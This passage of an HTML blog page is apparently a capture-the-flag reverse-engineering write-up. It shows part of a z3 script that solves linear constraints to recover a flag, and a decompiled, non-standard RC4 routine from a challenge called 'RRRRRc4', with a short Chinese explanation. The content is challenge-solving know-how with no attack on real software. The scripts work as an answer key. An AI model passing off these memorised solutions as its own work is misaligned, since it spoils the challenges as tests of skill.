class="token operator">==</span> <span class="token number">664504</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">305</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">226</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">212</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">175</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">165</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">341</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">394</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token number">252</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">336</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">155</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">215</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">331</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">230</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">241</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">225</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">186</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">34</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">237</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">336</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">473092</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">353</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">216</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">252</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">233</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">254</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">234</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token number">148</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">324</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">317</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">213</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">309</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">280</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">118</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">155</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">161</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token number">303</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">76</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">109</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">102</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">497492</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">89</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">148</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">274</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">220</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">202</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">123</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">231</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">169</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">278</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">259</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">208</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">219</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">371</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">181</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">104</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">392</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">285</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">113</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">298</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">389</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">322</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">338</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">237</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">234</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">261</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">345</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">361</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">659149</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">361</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">359</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">315</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">137</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">300</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">371</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">264</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">317</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">215</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">155</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">215</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">330</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">239</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">212</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">354</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">310</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">374</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">380</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">215</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">351</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">141</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">115</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">108</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">629123</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>
    m <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> v <span class="token keyword">in</span> v4<span class="token punctuation">:</span>
    	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'None'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">continue</span>
        i <span class="token operator">=</span> m<span class="token punctuation">[</span>v<span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">//</span> i是<span class="token builtin">int</span> ref<span class="token punctuation">,</span>需要转<span class="token builtin">str</span>然后转<span class="token builtin">int</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_1400795E0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 inputString<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> __int64 key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a6<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+44h] [rbp+24h]</span>
  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+44h] [rbp+24h]</span>
  <span class="token keyword">char</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp+44h]</span>
  <span class="token keyword">char</span> v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp+44h]</span>
  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+A4h] [rbp+84h]</span>

  result <span class="token operator">=</span> <span class="token function">sub_14007555C</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1401A7007<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>key <span class="token operator">+</span> i <span class="token operator">%</span> a6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> v10<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
    v12 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v10<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">=</span> v12<span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> a4 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v9 <span class="token operator">=</span> <span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
    v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v9<span class="token punctuation">)</span> <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
    v13 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v9<span class="token punctuation">)</span> <span class="token operator">=</span> v13<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>inputString <span class="token operator">+</span> v14<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1
                                                <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v9<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">--</span>a4<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>初始化数组 产生一个s盒 异或上s盒 是rc4的特征，不过不是标准的rc4，所以需要跟着逻辑写一下然后解密</p>
